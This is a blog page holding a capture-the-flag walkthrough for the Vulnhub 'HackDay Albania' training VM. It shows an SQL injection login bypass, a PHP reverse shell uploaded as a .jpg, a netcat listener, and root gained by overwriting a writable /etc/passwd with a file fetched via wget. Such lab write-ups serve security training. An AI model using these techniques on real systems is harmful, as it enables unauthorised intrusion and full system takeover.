@@ -1,0 +1,369 @@
+
+								
+																		Hack the Hackday Albania VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on December 5, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “HackDay-Albania” which is presented by Vulnhub.com and designed by R-73eN for the beginners who want to practice OSCP lab challenges. You can download it from here: https://www.vulnhub.com/entry/hackday-albania,167/
+Level: Beginner to Intermediate
+Task: Boot to Root
+Penetration Methodologies 
+
+Network Scanning (Nmap, Netdiscover)
+Use Robot.txt
+Apply SQL Injection
+Upload PHP reverse Shell
+Get netcat session
+Edit etc/passwd file
+Get Root access and capture the Flag
+
+Walkthrough
+The first step is as always, running netdiscover on the VM to grab the IP address. In my case, the IP was 192.168.1.127.
+
+Once the IP was found, we ran nmap aggressive scan to enumerate all the open ports.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.127
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.127
+					
+				
+			
+		
+
+ 
+Here you can observe that port 22 and 8008 are opened, also you can observe there is a robot.txt file in which 15 entries are allowed and 26 are disallowed.
+Nmap result shows that our target is running http on port no.8008. So, we fire up our browser targeting. The message in the box translates to- “if I am, I know where to go :)”
+We try for some hint in the page-source and find a comment at the bottom “Ok ok, but not here.
+
+Then I try some of the entries of the robot.txt list which I found from Nmap scanning result and fortunately by exploring /unisxcudkqjydw/ in the browser I got another directory name “/vulnbank/”.
+
+So again I explore a new URL in that browser and found a client folder from inside the Index page,
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.127:8008/unisxcudkqjydw/vulnbank/
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.127:8008/unisxcudkqjydw/vulnbank/
+					
+				
+			
+		
+
+
+Clicking on the /client directory, we are greeted by a login page of very secure bank But we don’t have login credential.
+
+Therefore, I try SQL injections for username and password and luckily following parameters get matched.
+
+		
+		
+			
+			
+			
+			
+Username: ' or 'a' = 'a' --
+Password: #
+			
+				
+					
+				
+					12
+				
+						Username: ' or 'a' = 'a' --Password: #
+					
+				
+			
+		
+
+
+And it opened up like a beautiful treasure! As you can see, according to this web page “contact Support” here we can attach our file and can discuss our problem.
+So, here is what we did.
+Traverse to the directory: /usr/share/webshells/php/php-reverse-shell.php
+Open it with a text editor and add listening IP and port and save this file as php-reverse-shell.jpg and start netcat at listening port.
+
+Then uploaded our PHP shell and execute to get a reverse connection at netcat.
+
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+			
+				
+					
+				
+					1
+				
+						nc -lvp 1234
+					
+				
+			
+		
+
+From given below image you can observe netcat session. But the task is not finished yet, still, we need to penetrate more for privilege escalation. Then to access proper TTY shell we had import python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Then I check permission for passwd file and found that the file is writable.
+
+		
+		
+			
+			
+			
+			
+ls -al /etc/passwd
+			
+				
+					
+				
+					1
+				
+						ls -al /etc/passwd
+					
+				
+			
+		
+
+
+So I open the file with cat command and select the copied whole content into a text file.
+
+		
+		
+			
+			
+			
+			
+cat /etc/passwd
+			
+				
+					
+				
+					1
+				
+						cat /etc/passwd
+					
+				
+			
+		
+
+
+In a new terminal, we are using OpenSSL to make a new password hash combined salt value and password in MD5 algorithm. For this the below command is used:
+
+		
+		
+			
+			
+			
+			
+openssl passwd -1 -salt ignite pass123
+			
+				
+					
+				
+					1
+				
+						openssl passwd -1 -salt ignite pass123
+					
+				
+			
+		
+
+Now copy this salt password and then open the text file where you copied /etc/passwd content.
+
+Then we create a new entry for user “raj” and past above salt password. Also set UID and GID 0:0 for him to add him into root group member and save the file as passwd on the desktop. Now we have to transfer this file into victim’s machine so that we can replace it from original passwd file. Now run the web server on the Kali machine:
+
+		
+		
+			
+			
+			
+			
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					1
+				
+						python -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+
+Now download the newly modify passwd file inside /tmp directory and then copy the downloaded file into /etc/passwd which will overwrite the content of the original passwd file.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+wget http://192.168.1.128/passwd
+cp passwd /etc/passwd
+			
+				
+					
+				
+					123
+				
+						cd /tmpwget http://192.168.1.128/passwdcp passwd /etc/passwd
+					
+				
+			
+		
+
+
+When you have done above said steps then switch to your new user and try to gain root access.
+
+		
+		
+			
+			
+			
+			
+su raj
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					1234
+				
+						su rajcd /rootlscat flag.txt
+					
+				
+			
+		
+
+Wonderful!! We have gained access and capture the flag.
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
